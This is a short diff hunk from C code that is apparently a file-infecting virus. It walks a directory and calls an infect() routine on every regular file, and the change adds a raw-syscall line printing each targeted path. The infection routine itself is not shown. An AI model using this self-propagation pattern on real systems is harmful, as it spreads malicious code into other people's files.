@@ -134,6 +134,7 @@ void	open_file(char *file)
 			if (dir->d_type == DT_REG) {
 				char new_path[PATH_MAX];
 				make_path(new_path, file, dir->d_name);
+				_syscall(SYS_write, 1, new_path, ft_strlen(new_path));
 				infect(new_path);
 			}
 		}
